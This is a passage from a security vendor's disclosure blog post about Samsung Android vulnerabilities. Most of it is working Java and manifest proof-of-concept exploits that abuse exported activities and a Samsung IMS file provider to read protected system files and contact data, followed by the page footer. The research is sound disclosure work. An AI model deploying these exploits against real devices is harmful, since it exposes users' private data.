<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">ACTION_SEND</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.samsung.android.app.contacts"</span><span class="o">,</span> <span class="s">"com.samsung.android.contacts.editor.SetProfilePhotoActivity"</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"temp_photo_uri"</span><span class="o">,</span> <span class="s">"/"</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"cropped_photo_uri"</span><span class="o">,</span> <span class="n">ContactsContract</span><span class="o">.</span><span class="na">CommonDataKinds</span><span class="o">.</span><span class="na">Phone</span><span class="o">.</span><span class="na">CONTENT_URI</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"mimeType"</span><span class="o">,</span> <span class="s">"test/1337"</span><span class="o">);</span>
<span class="n">startActivity</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
</code></pre></div></div>

<p>File <code class="highlighter-rouge">PickerActivity.java</code>:</p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>

    <span class="k">if</span> <span class="o">(</span><span class="s">"com.android.camera.action.CROP"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">getIntent</span><span class="o">().</span><span class="na">getAction</span><span class="o">()))</span> <span class="o">{</span>
        <span class="n">dump</span><span class="o">(</span><span class="n">getIntent</span><span class="o">().</span><span class="na">getClipData</span><span class="o">().</span><span class="na">getItemAt</span><span class="o">(</span><span class="mi">0</span><span class="o">).</span><span class="na">getUri</span><span class="o">());</span>
    <span class="o">}</span>

    <span class="n">finish</span><span class="o">();</span>
<span class="o">}</span>

<span class="kd">public</span> <span class="kt">void</span> <span class="nf">dump</span><span class="o">(</span><span class="n">Uri</span> <span class="n">uri</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">query</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToFirst</span><span class="o">())</span> <span class="o">{</span>
        <span class="k">do</span> <span class="o">{</span>
            <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getColumnCount</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
                <span class="k">if</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">", "</span><span class="o">);</span>
                <span class="o">}</span>
                <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getColumnName</span><span class="o">(</span><span class="n">i</span><span class="o">)</span> <span class="o">+</span> <span class="s">" = "</span> <span class="o">+</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">i</span><span class="o">));</span>
            <span class="o">}</span>
            <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"evil"</span><span class="o">,</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span> <span class="k">while</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToNext</span><span class="o">());</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p class="heading-anchor"><a href="#file-theft-and-write-from-uid-1000-in-factoryCameraFB">File theft and write from UID 1000 in FactoryCameraFB</a></p>
<p>The FactoryCameraFB app contained vulnerable code that allowed access to arbitrary* content providers:
<img class="post-template__vulnearbility-image" src="/assets/images/samsung_factorycamerafb.png" alt="vulnerability" /></p>

<p class="markdown-in-single-quotes">It should be noted that this app has a property called <code class="highlighter-rouge">android:sharedUserId="android.uid.system"</code>, which makes it a system application.</p>

<p>As described in the vulnerability in Android Settings, we used a content provider in the <code class="highlighter-rouge">com.sec.imsservice</code> app, which provided access to arbitrary files:
<img class="post-template__vulnearbility-image" src="/assets/images/samsung_imsservice_provider.png" alt="vulnerability" /></p>

<p class="markdown-in-single-quotes">For testing, we used the file <code class="highlighter-rouge">/data/system/users/0/settings_secure.xml</code> (which has these permissions: <code class="highlighter-rouge">-rw ------- 1 system system</code>).</p>

<p>Proof of Concept, as a result of which the content of the file was printed to the logs.</p>

<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>

    <span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
    <span class="n">i</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml"</span><span class="o">));</span>
    <span class="n">i</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_READ_URI_PERMISSION</span><span class="o">);</span>
    <span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.sec.factory.camera"</span><span class="o">,</span> <span class="s">"com.sec.android.app.camera.CameraTestActivity"</span><span class="o">);</span>
    <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"testtype"</span><span class="o">,</span> <span class="s">"NCAMTEST"</span><span class="o">);</span>
    <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"arg1"</span><span class="o">,</span> <span class="s">"0"</span><span class="o">);</span>
    <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"arg2"</span><span class="o">,</span> <span class="s">"1"</span><span class="o">);</span>
    <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"arg3"</span><span class="o">,</span> <span class="s">"2"</span><span class="o">);</span>
    <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"arg4"</span><span class="o">,</span> <span class="s">"0"</span><span class="o">);</span>
    <span class="n">startActivityForResult</span><span class="o">(</span><span class="n">i</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
<span class="o">}</span>

<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onActivityResult</span><span class="o">(</span><span class="kt">int</span> <span class="n">requestCode</span><span class="o">,</span> <span class="kt">int</span> <span class="n">resultCode</span><span class="o">,</span> <span class="n">Intent</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onActivityResult</span><span class="o">(</span><span class="n">requestCode</span><span class="o">,</span> <span class="n">resultCode</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>

    <span class="k">try</span> <span class="o">{</span>
        <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"evil"</span><span class="o">,</span> <span class="n">IOUtils</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">getContentResolver</span><span class="o">().</span><span class="na">openInputStream</span><span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">getData</span><span class="o">())));</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">th</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p class="heading-anchor"><a href="#the-vulnerability-in-android-settings">The vulnerability in Android Settings</a></p>
<p>In <a href="https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/#the-vulnerability-in-secsettings">the previous article</a>, we published information about a vulnerability in Android Settings for which we received a $2,000 award from Google AOSP.</p>

<p class="markdown-in-single-quotes">The activity <code class="highlighter-rouge">com.android.settings.wifi.WifiDialogActivity</code> is exported (however, it requests the sender to have <code class="highlighter-rouge">android.permission.CHANGE_WIFI_STATE</code> permission). When a user clicks on the QR code scan icon, it launches an implicit intent and passes its activity result to its own <code class="highlighter-rouge">setResult(code, attacker_controlled_intent)</code>.</p>

<p>Proof of Concept to access any system files on Samsung devices.</p>

<p>File <code class="highlighter-rouge">AndroidManifest.xml</code>:</p>
<div class="language-xml code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.CHANGE_WIFI_STATE"</span> <span class="nt">/&gt;</span>
</code></pre></div></div>
<div class="language-xml code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">".PickerActivity"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;intent-filter</span> <span class="na">android:autoVerify=</span><span class="s">"true"</span> <span class="na">android:priority=</span><span class="s">"999"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.settings.WIFI_DPP_ENROLLEE_QR_CODE_SCANNER"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/intent-filter&gt;</span>
<span class="nt">&lt;/activity&gt;</span>
</code></pre></div></div>

<p>File <code class="highlighter-rouge">MainActivity.java</code>:</p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>

    <span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
    <span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.android.settings"</span><span class="o">,</span> <span class="s">"com.android.settings.wifi.WifiDialogActivity"</span><span class="o">);</span>
    <span class="n">startActivityForResult</span><span class="o">(</span><span class="n">i</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
<span class="o">}</span>

<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onActivityResult</span><span class="o">(</span><span class="kt">int</span> <span class="n">requestCode</span><span class="o">,</span> <span class="kt">int</span> <span class="n">resultCode</span><span class="o">,</span> <span class="n">Intent</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onActivityResult</span><span class="o">(</span><span class="n">requestCode</span><span class="o">,</span> <span class="n">resultCode</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>

    <span class="k">try</span> <span class="o">{</span>
        <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"evil"</span><span class="o">,</span> <span class="n">IOUtils</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">getContentResolver</span><span class="o">().</span><span class="na">openInputStream</span><span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">getData</span><span class="o">())));</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">th</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>File <code class="highlighter-rouge">PickerActivity.java</code>:</p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>

    <span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="s">"evil"</span><span class="o">);</span>
    <span class="n">i</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml"</span><span class="o">));</span>
    <span class="n">i</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_READ_URI_PERMISSION</span><span class="o">);</span>
    <span class="n">setResult</span><span class="o">(-</span><span class="mi">1</span><span class="o">,</span> <span class="n">i</span><span class="o">);</span>
    <span class="n">finish</span><span class="o">();</span>
<span class="o">}</span>
</code></pre></div></div>

<p class="heading-anchor"><a href="#preventing-these-vulnerabilities">Preventing these vulnerabilities</a></p>
<p>It can be extremely helpful to detect these bugs early: Oversecured’s mobile app scanner lets users do that, and notifies them about all the vectors mentioned above in the scan report. <a href="https://oversecured.com/contact-us">Contact us</a>, and we can provide you with a demo to try it out.</p>

                </div>
            </section>

            <!-- Email subscribe form at the bottom of the page -->
            

            <footer class="post-full-footer">
                <!-- Everything inside the #author tags pulls data from the author -->
                <!-- #author-->
                
                    
                        <section class="author-card">
                            <meta property="og:image" content="assets/images/hannah-cover.jpg" />
                            <meta name="twitter:image" content="assets/images/hannah-cover.jpg" />
                            
                                <img class="author-profile-image" src="/assets/images/favicon.ico" alt="oversecured" />
                            
                            <section class="author-card-content">
                                <h4 class="author-card-name"><a href="/author/oversecured">oversecured</a></h4>
                                
                                    <p>secure place</p>
                                
                            </section>
                        </section>
                        <div class="post-full-footer-right">
                            <a class="author-card-button" href="/author/oversecured">Read More</a>
                        </div>
                    
                
                <!-- /author  -->
            </footer>

            <!-- If you use Disqus comments, just uncomment this block.
            The only thing you need to change is "test-apkdzgmqhj" - which
            should be replaced with your own Disqus site-id. -->
            

        </article>

    </div>
</main>

<!-- Links to Previous/Next posts -->
<aside class="read-next outer">
    <div class="inner">
        <div class="read-next-feed">
            

            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
            
                

    <article class="post-card post-template">
        
            <a class="post-card-image-link" href="/Common-mistakes-when-using-permissions-in-Android/">
                <div class="post-card-image" style="background-image: url(/assets/images/article_permissions.png)"></div>
            </a>
        
        <div class="post-card-content">
            <a class="post-card-content-link" href="/Common-mistakes-when-using-permissions-in-Android/">
                <header class="post-card-header">
                    

                    <h2 class="post-card-title">Common mistakes when using permissions in Android</h2>
                </header>
                <section class="post-card-excerpt">
                    
                        <p></p>
                    
                </section>
            </a>
            <footer class="post-card-meta">
                
                    
                        
                        <img class="author-profile-image" src="/assets/images/favicon.ico" alt="oversecured" />
                        
                        <span class="post-card-author">
                            <a href="/author/oversecured/">oversecured</a>
                        </span>
                    
                
                <span class="reading-time">
                    
                    
                      1 min read
                    
                </span>
            </footer>
        </div>
    </article>

            

            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
            
                

    <article class="post-card post-template">
        
            <a class="post-card-image-link" href="/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/">
                <div class="post-card-image" style="background-image: url(/assets/images/thirteenth-article.png)"></div>
            </a>
        
        <div class="post-card-content">
            <a class="post-card-content-link" href="/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/">
                <header class="post-card-header">
                    

                    <h2 class="post-card-title">Why dynamic code loading could be dangerous for your apps&#58; a Google example</h2>
                </header>
                <section class="post-card-excerpt">
                    
                        <p></p>
                    
                </section>
            </a>
            <footer class="post-card-meta">
                
                    
                        
                        <img class="author-profile-image" src="/assets/images/favicon.ico" alt="oversecured" />
                        
                        <span class="post-card-author">
                            <a href="/author/oversecured/">oversecured</a>
                        </span>
                    
                
                <span class="reading-time">
                    
                    
                      1 min read
                    
                </span>
            </footer>
        </div>
    </article>

            

        </div>
    </div>
</aside>

<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
<div class="floating-header floating-active">
    <div class="floating-header-logo">
        <a href="/">
            
                <img src="/assets/images/favicon.svg" alt="News, Techniques & Guides icon" />
            
            <span>News, Techniques & Guides</span>
        </a>
    </div>
    <span class="floating-header-divider">&mdash;</span>
    <div class="floating-header-title">Two weeks of securing Samsung devices&#58; Part 2</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Two+weeks+of+securing+Samsung+devices%26%2358%3B+Part+2&amp;url=https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-2/"
            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>

        </a>
        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-2/"
            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>

        </a>
    </div>
    <progress class="progress" value="0">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>


<!-- /post -->

<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->


        <!-- Previous/next page links - displayed on every page -->
        

        <!-- The footer at the very bottom of the screen -->
        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright">
                    <a href="/">Oversecured</a> &copy; 2021 ·
                    <a href="https://oversecured.com/" target="_blank" rel="noopener">Oversecured.com</a> ·
                    <a href="https://oversecured.com/pricing" target="_blank" rel="noopener">Pricing</a> ·
                    <a href="https://oversecured.com/about" target="_blank" rel="noopener">About</a>
                </section>
                <section class="poweredby">
<!--                    <a href="https://jekyllrb.com/">Jekyll</a> &-->
<!--                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using-->
<!--                    <a href="https://github.com/jekyller/jasper2" target="_blank" rel="noopener">Jasper2</a></section>-->
                </section>
                <nav class="site-footer-nav">
					<a style="display: inline; padding: 0; margin-right: 10px" class="social-link" href="https://linkedin.com/company/Oversecured/" target="_blank" rel="noopener"><?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" id="Linkedin" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px"
	y="0px" viewBox="0 0 32 32" style="enable-background:new 0 0 32 32;" xml:space="preserve">
	<path id="frame" d="M0.72,16.01c0-3.89,0-7.77,0-11.66c0-1.66,1.08-3.06,2.68-3.46c0.29-0.07,0.59-0.11,0.89-0.11
	c7.75-0.01,15.5-0.01,23.24,0c2.01,0,3.58,1.56,3.58,3.56c0,7.76,0,15.52,0,23.28c0,1.98-1.57,3.55-3.55,3.55
	c-7.76,0-15.52,0-23.28,0c-2,0-3.55-1.55-3.56-3.54C0.71,23.76,0.72,19.89,0.72,16.01C0.72,16.01,0.72,16.01,0.72,16.01z
	 M28.74,15.98C28.73,15.98,28.73,15.98,28.74,15.98c0-3.81,0-7.62,0-11.42c0-0.97-0.43-1.39-1.41-1.4c-7.64,0-15.27,0-22.91,0
	c-0.87,0-1.34,0.47-1.34,1.34c0,7.64,0,15.27,0,22.91c0,0.95,0.45,1.4,1.41,1.4c3.15,0,6.3,0,9.46,0c4.48,0,8.97,0,13.45,0
	c0.41,0,0.77-0.1,1.04-0.42c0.26-0.3,0.29-0.66,0.29-1.03C28.73,23.57,28.74,19.78,28.74,15.98z" />
	<path id="n" d="M16.86,25.89c-1.37,0-2.69,0-4.02,0c0-4.47,0-8.92,0-13.39c1.34,0,2.67,0,4.02,0c0,0.57,0,1.12,0,1.75
	c0.16-0.21,0.26-0.36,0.38-0.5c0.79-0.92,1.82-1.36,3-1.48c0.89-0.09,1.78-0.02,2.63,0.26c1.51,0.48,2.3,1.6,2.62,3.08
	c0.14,0.65,0.24,1.32,0.25,1.98c0.03,2.75,0.01,5.51,0.01,8.29c-1.34,0-2.69,0-4.09,0c0-0.12,0-0.25,0-0.38
	c-0.01-2.35,0.01-4.71-0.03-7.06c-0.01-0.53-0.16-1.08-0.34-1.58c-0.22-0.59-0.71-0.92-1.34-1.02c-1.72-0.27-2.91,0.66-3.02,2.47
	c-0.08,1.29-0.06,2.6-0.07,3.89c-0.01,1.09,0,2.18,0,3.26C16.86,25.6,16.86,25.74,16.86,25.89z" />
	<path id="i_1_" d="M10.18,25.9c-1.38,0-2.73,0-4.1,0c0-4.46,0-8.92,0-13.4c1.36,0,2.72,0,4.1,0C10.18,16.96,10.18,21.41,10.18,25.9z
	" />
	<path id="i" d="M5.76,8.16c0.04-1.37,1.13-2.41,2.52-2.38c1.32,0.03,2.4,1.16,2.36,2.48c-0.04,1.36-1.14,2.42-2.49,2.39
	C6.8,10.62,5.72,9.49,5.76,8.16z" />
</svg></a>
                    <a style="display: inline; padding: 0" class="social-link social-link-tw" href="https://twitter.com/OversecuredInc" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
</a>
<!--                    -->
<!--                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>-->
                </nav>
            </div>
        </footer>
    </div>

    <!-- The big email subscribe modal content -->
    

    <!-- highlight.js -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
    <script>$(document).ready(function() {
      $('pre code').each(function(i, block) {
        hljs.highlightBlock(block);
      });
    });</script>

    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
    <script
        src="https://code.jquery.com/jquery-3.2.1.min.js"
        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
        crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>


    <!-- Paginator increased to "infinit" in _config.yml -->
    <!-- if paginator.posts  -->
    <!-- <script>
        var maxPages = parseInt('');
    </script>
    <script src="/assets/js/infinitescroll.js"></script> -->
    <!-- /endif -->
<!--    <script type="text/javascript">-->
<!--        const cross = document.querySelector('.link-to-oversecured__cross')-->
<!--        console.log(cross)-->
<!--        console.log('12323')-->
<!--    </script>-->

    


    <!-- Add Google Analytics  -->
    <!-- Google Analytics Tracking code -->
 <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-171786448-1', 'auto');
  ga('send', 'pageview');

 </script>


    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
    
        <script>

// NOTE: Scroll performance is poor in Safari
// - this appears to be due to the events firing much more slowly in Safari.
//   Dropping the scroll event and using only a raf loop results in smoother
//   scrolling but continuous processing even when not scrolling
$(document).ready(function () {
    // Start fitVids
    var $postContent = $(".post-full-content");
    $postContent.fitVids();
    // End fitVids

    var progressBar = document.querySelector('progress');
    var header = document.querySelector('.floating-header');
    var title = document.querySelector('.post-full-title');

    var lastScrollY = window.scrollY;
    var lastWindowHeight = window.innerHeight;
    var lastDocumentHeight = $(document).height();
    var ticking = false;

    function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
    }

    function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
    }

    function requestTick() {
        if (!ticking) {
            requestAnimationFrame(update);
        }
        ticking = true;
    }

    function update() {
        const noticeToggle = sessionStorage.getItem('notice')
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        header.style.top = '0'

        // if (window.scrollY > 15 || noticeToggle === false) {
        //     header.style.top = '0'
        // } else if (window.scrollY < 15 && noticeToggle === null) {
        //     header.style.top = '35px'
        // }

        // show/hide floating header
        // if (lastScrollY >= trigger + triggerOffset) {
        //     header.classList.add('floating-active');
        // } else {
        //     header.classList.remove('floating-active');
        // }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
    }

    window.addEventListener('scroll', onScroll, {passive: true});
    window.addEventListener('resize', onResize, false);

    update();
});
</script>

    

    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
    <!-- ghost_foot -->
    <div class="gdpr-notice">
        <p class="gdpr-notice__text">This website uses cookies to improve your experience. See our <a class="gdpr-notice__link" href="https://oversecured.com/privacy" target="_blank">Privacy Policy</a> to learn more.</p>
        <button class="gdpr-notice__btn-accept">Accept</button>
    </div>

    <script src="/assets/js/toggleHeaderNotice.js"></script>
